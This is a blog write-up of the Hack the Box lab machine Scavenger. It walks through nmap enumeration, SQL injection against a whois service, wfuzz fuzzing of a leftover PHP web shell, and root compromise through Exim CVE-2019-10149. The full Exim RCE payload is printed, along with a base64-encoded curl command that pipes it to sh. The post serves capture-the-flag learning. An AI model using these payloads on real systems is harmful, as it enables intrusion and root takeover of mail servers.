+++
author = "Nick"
categories = ["enumeration", "hack the box", "curl", "gobuster", "wfuzz", "command injection", "SQL Injection", "mariadb", "whois", "exim", "CVE-2019-10149"]
date = 2020-02-29T11:00:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2019/11/scavenger.png"
slug = "hack-the-box-scavenger"
summary = "Welcome back! This will be my write-up for the machine Scavenger. Lets dig in!"
tags = ["enumeration", "hack the box", "curl", "gobuster", "wfuzz", "command injection", "SQL Injection", "mariadb", "whois", "exim", "CVE-2019-10149"]
title = "Hack the Box - Scavenger"

+++


Welcome back! This will be my write-up for the machine Scavenger. Lets dig in!

Like we do with every box, we start with our ```nmap``` scan: ```nmap -sC -sV -oA initial_scan 10.10.10.155```. Here our results:

```
Nmap scan report for 10.10.10.155
Host is up (0.053s latency).
Not shown: 993 closed ports
PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           vsftpd 3.0.3
22/tcp   open     ssh           OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
25/tcp   open     smtp          Exim smtpd 4.89
| smtp-commands: ib01.supersechosting.htb Hello nmap.scanme.org [10.10.15.154], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
43/tcp   open     whois?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|     This query returned 0 object
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
53/tcp   open     domain        ISC BIND 9.10.3-P4 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Debian
80/tcp   open     http          Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
1152/tcp filtered winpoplanmess
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port43-TCP:V=7.80%I=7%D=11/7%Time=5DC43F6F%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,A9,"%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
SF:0returned\x200\x20object\r\n")%r(GetRequest,A9,"%\x20SUPERSECHOSTING\x2
SF:0WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20i
SF:nformation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersecho
SF:sting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n")%r(HTT
SF:POptions,A9,"%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
SF:0returned\x200\x20object\r\n")%r(RTSPRequest,A9,"%\x20SUPERSECHOSTING\x
SF:20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20
SF:information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersech
SF:osting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n")%r(He
SF:lp,A9,"%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.
SF:1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20v
SF:isit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x20retur
SF:ned\x200\x20object\r\n")%r(SSLSessionReq,103,"%\x20SUPERSECHOSTING\x20W
SF:HOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20inf
SF:ormation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersechost
SF:ing\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\x20collations\x2
SF:0\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_general_ci,COERCIBLE\
SF:)\x20for\x20operation\x20'like'")%r(TerminalServerCookie,103,"%\x20SUPE
SF:RSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20fo
SF:r\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://w
SF:ww\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\
SF:x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_gener
SF:al_ci,COERCIBLE\)\x20for\x20operation\x20'like'")%r(TLSSessionReq,103,"
SF:%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r
SF:\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x2
SF:0http://www\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20m
SF:ix\x20of\x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(u
SF:tf8_general_ci,COERCIBLE\)\x20for\x20operation\x20'like'");
Service Info: Host: ib01.supersechosting.htb; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

From this we see a few things. The first thing that should stick out is the use of ```exim```. There have recently been a slew of notable vulnerabilities in this software we might be able to leverage right to root. We also get a hostname and sub domain on the machine: ```supersechosting.htb``` and ```ib01.supersechosting.htb```, let's add it to our host file. We also see some data returned from ```cgi-bin``` using ```MariaDB10```. Before we start our manual enumeration, we are going to run ```gobuster``` to see what else can be easily enumerated: 

```gobuster dir -u http://supersechosting.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50```

![](/images/2019/11/image-1.png" caption="gobuster results)

The ```gobuster``` results come back fairly standard. We will probably need to enumerate vhosts on this system further down the line. After this I did a quick ```dnsenum``` against the server to see what might be there: ```dnsenum --dnsserver 10.10.10.155 supersechosting.htb``` For now we'll browse to the web service running and see what's there.

![](/images/2019/11/image-3.png)

Well, we have a mail server name as well. We've done some basic enumeration around port 53 as well as 80. We should look to enumerate port 43, which is ```whois```. We can interact with the port via ```nc```. From our previous enumeration we know that it has a linked ```MariaDB``` associated to it. It's possible that we can use SQL commands direct to the port and have them queued for processing.

![](/images/2019/11/image-4.png)

We confirm this by entering some fault characters and see what response we get. Now we have to try and craft some ```SQL``` queries to find what data we can. After A LOT of failed queries, we get some data in the form of another table, ```whois```. We dig deaper into this table and are finally able to find customer name and data. Within that there are more host names.

![](/images/2019/11/image-6.png)

![](/images/2019/11/image-5.png)

We'll add these to our host file as well. Now that we have some more hostnames we'll repeat our above enumeration processes on these. When we finish we see we have another new address:

![](/images/2019/11/image-7.png)

```sec03.rentahacker.htb```. Ok, lets take a look.

![](/images/2019/11/image-8.png)

We now have a webpage that says its been owned. We also saw an interesting .php file during our enumeration:

![](/images/2019/11/image-9.png)

The hackers seemingly left behind the shell they used, handy! The file itself doesn't seem to have visible content. However that doesn't mean it was meant to give a remote shell. Often we can leverage files for [command injection](https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)). So we'll fuzz the URL for a command processor and the command.

We will use ```wfuzz``` or ```ffuf```. Here are the parts of the URL we want to fuzz:

http://sec3.rentahacker.htb/shell.php```COMMAND_PROCESSOR```=```COMMAND```.

So in this case we'll use the command ```whoami``` and fuzz for the ```COMMAND_PROCESSOR```. Our command will look like this:

```wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://sec03.rentahacker.htb/shell.php\?FUZZ\=whoami -fs 0```

We fuzz with the Burp-Parameters file. We are hiding the response size (```-fs```) of 0 as well. We only want responses that return actual data.

![](/images/2019/11/image-10.png)

We found one! The command ```hidden``` has returned data. Lets ```curl``` this URL and see what it returns.

![](/images/2019/11/image-11.png)

We do get a hostname back. Using this method we can enumerate the box further.

![](/images/2019/11/image-13.png)

We check the `exim` version to see if we're vulnerable.

![](/images/2019/11/image-12.png)

We are [indeed vulnerable](https://packetstormsecurity.com/files/153218/Exim-4.9.1-Remote-Command-Execution.html). Since the ```user.txt``` file is not listed in our current user directory we'll try to obtain root first and go backwards. We'll craft our payload according to the advisory, with one minor change. We will be copying the root flag to ```/dev/shm/root```. So our code will look like this:

```
touch /dev/shm/flag;(sleep 0.1 ; echo HELO foo ; sleep 0.1 ; echo 'MAIL FROM:<>' ; sleep 0.1 ; echo 'RCPT TO:<${run{\x2Fbin\x2Fsh\x09-c\x09\x22cat\x09\x2Froot\x2Froot.txt\x3E\x3E\x2Fdev\x2Fshm\x2Froot\x22}}@localhost>' ; sleep 0.1 ; echo DATA ; sleep 0.1 ; echo "Received: 1" ; echo "Received: 2" ;echo "Received: 3" ;echo "Received: 4" ;echo "Received: 5" ;echo "Received: 6" ;echo "Received: 7" ;echo "Received: 8" ;echo "Received: 9" ;echo "Received: 10" ;echo "Received: 11" ;echo "Received: 12" ;echo "Received: 13" ;echo "Received: 14" ;echo "Received: 15" ;echo "Received: 16" ;echo "Received: 17" ;echo "Received: 18" ;echo "Received: 19" ;echo "Received: 20" ;echo "Received: 21" ;echo "Received: 22" ;echo "Received: 23" ;echo "Received: 24" ;echo "Received: 25" ;echo "Received: 26" ;echo "Received: 27" ;echo "Received: 28" ;echo "Received: 29" ;echo "Received: 30" ;echo "Received: 31" ;echo "" ; echo "." ; echo QUIT) | nc 127.0.0.1 25
```

Then we will ```base64``` encode it and put it into a ```curl``` request. We can then pipe it to ```base64 -d``` to decode it within the URL. Our final request looks like this:

```
curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+dG91Y2ggL2Rldi9zaG0vZmxhZzsoc2xlZXAgMC4xIDsgZWNobyBIRUxPIGZvbyA7IHNsZWVwIDAuMSA7IGVjaG8gJ01BSUwgRlJPTTo8PicgOyBzbGVlcCAwLjEgOyBlY2hvICdSQ1BUIFRPOjwke3J1bntceDJGYmluXHgyRnNoXHgwOS1jXHgwOVx4MjJjYXRceDA5XHgyRnJvb3RceDJGcm9vdC50eHRceDNFXHgzRVx4MkZkZXZceDJGc2htXHgyRnJvb3RceDIyfX1AbG9jYWxob3N0PicgOyBzbGVlcCAwLjEgOyBlY2hvIERBVEEgOyBzbGVlcCAwLjEgOyBlY2hvICJSZWNlaXZlZDogMSIgOyBlY2hvICJSZWNlaXZlZDogMiIgO2VjaG8gIlJlY2VpdmVkOiAzIiA7ZWNobyAiUmVjZWl2ZWQ6IDQiIDtlY2hvICJSZWNlaXZlZDogNSIgO2VjaG8gIlJlY2VpdmVkOiA2IiA7ZWNobyAiUmVjZWl2ZWQ6IDciIDtlY2hvICJSZWNlaXZlZDogOCIgO2VjaG8gIlJlY2VpdmVkOiA5IiA7ZWNobyAiUmVjZWl2ZWQ6IDEwIiA7ZWNobyAiUmVjZWl2ZWQ6IDExIiA7ZWNobyAiUmVjZWl2ZWQ6IDEyIiA7ZWNobyAiUmVjZWl2ZWQ6IDEzIiA7ZWNobyAiUmVjZWl2ZWQ6IDE0IiA7ZWNobyAiUmVjZWl2ZWQ6IDE1IiA7ZWNobyAiUmVjZWl2ZWQ6IDE2IiA7ZWNobyAiUmVjZWl2ZWQ6IDE3IiA7ZWNobyAiUmVjZWl2ZWQ6IDE4IiA7ZWNobyAiUmVjZWl2ZWQ6IDE5IiA7ZWNobyAiUmVjZWl2ZWQ6IDIwIiA7ZWNobyAiUmVjZWl2ZWQ6IDIxIiA7ZWNobyAiUmVjZWl2ZWQ6IDIyIiA7ZWNobyAiUmVjZWl2ZWQ6IDIzIiA7ZWNobyAiUmVjZWl2ZWQ6IDI0IiA7ZWNobyAiUmVjZWl2ZWQ6IDI1IiA7ZWNobyAiUmVjZWl2ZWQ6IDI2IiA7ZWNobyAiUmVjZWl2ZWQ6IDI3IiA7ZWNobyAiUmVjZWl2ZWQ6IDI4IiA7ZWNobyAiUmVjZWl2ZWQ6IDI5IiA7ZWNobyAiUmVjZWl2ZWQ6IDMwIiA7ZWNobyAiUmVjZWl2ZWQ6IDMxIiA7ZWNobyAiIiA7IGVjaG8gIi4iIDsgZWNobyBRVUlUKSB8IG5jIDEyNy4wLjAuMSAyNQ==|base64+-d|sh"
```

We run the code and get a reply back.

![](/images/2019/11/image-14.png)

Now we should be able to curl our location for root and get the flag. We can use the above method to verify that the file was indeed created in our target location:

![](/images/2019/11/image-15.png)

We have our root flag! Now we can alternatly create the same payload with a reverse NC connection back to us to obtain a shell.

Now this box became very easy with the use of the recently released CVE. However, this was probably not the intended path for the machine but still a fun box none the less!

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

